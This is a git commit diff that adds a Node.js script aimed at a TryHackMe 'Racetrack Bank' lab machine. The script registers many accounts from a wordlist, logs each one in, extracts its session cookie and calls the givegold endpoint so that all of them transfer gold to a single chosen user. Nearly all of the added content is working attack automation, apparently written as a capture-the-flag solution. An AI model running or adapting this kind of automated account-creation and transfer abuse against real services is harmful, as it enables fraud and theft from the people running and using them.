bf148204f5dda71a3391af5b365e04f7195b6c0d
Wapzzz <91371533+Wapzzz@users.noreply.github.com>
2021-09-26 20:49:17 +0000

    Update script.js

--- script.js
+++ script.js
@@ -62,3 +62,79 @@ fs.readFileSync('WORDLIST PATH', 'utf-8') // In order for the machine to work yo
             });
         }, i * 50);
     });
+
+
+
+
+
+
+
+
+
+
+
+
+const request = require('request');
+const fs = require('fs');
+// Options
+
+let user = 'test'; // User to send the gold too, should be already registered
+let pass = 'pass'; // Password you want the users to have
+let host = '10.10.43.47'; // Your machine ip
+let sCode; // Leave that empty
+
+let cookies;
+let rightlength; // Leave that empty
+let cookie = ''; // Leave blank
+let goodCookie;
+
+
+fs.readFileSync('/root/boxes/THM_Racetrack_Bank/wordlist', 'utf-8')
+.split(/\r?\n/)
+.forEach((line, i) => {
+    setTimeout(() => {
+        let rdata = `username=tet${i}&password=${pass}&password2=${pass}`; // Register data
+        let ldata = `username=tet${i}&password=${pass}`; // Login data
+        let sdata = `user=${user}&amount=1`; // Send-Gold data
+        request.post({
+            headers: {'content-type' : 'application/x-www-form-urlencoded'},
+            url: `http://${host}/api/create`,
+            body: rdata
+        }, (err, response, body) => {
+            setTimeout(() => {
+                if (err) throw err;
+                console.log(body);
+                request.post({
+                    headers: {'content-type' : 'application/x-www-form-urlencoded'},
+                    url: `http://${host}/api/login`,
+                    body: ldata
+                }, (err, res, body) => {
+                    if (err) throw err;
+                    console.log(body);
+                    cookies = res.caseless.dict['set-cookie'][0];
+                    for(i=0; i <= cookies.length; i++) {
+                        if (cookies[i] === ';' && !rightlength) {
+                            rightlength = i;
+                        };
+                    };
+                    for(i=0; i<rightlength; i++) {
+                        cookie += cookies[i];
+                    };
+                    request.post({
+                        headers: {
+                            'content-type': 'application/x-www-form-urlencoded',
+                            'Cookie': `${cookies}`,
+                        },
+                        url: `http://${host}/api/givegold`,
+                        body: sdata,
+                    }, (err, resp, body) => {
+                        if (err) throw err;
+                        if(body.toString() === 'Found. Redirecting to /giving.html?success=Success!') {
+                            console.log(`User test${i} has sent 1 gold to ${user}! `, body);
+                        };
+                        });
+                    });
+                }, i * 50);
+            });
+        }, i * 50);
+    });
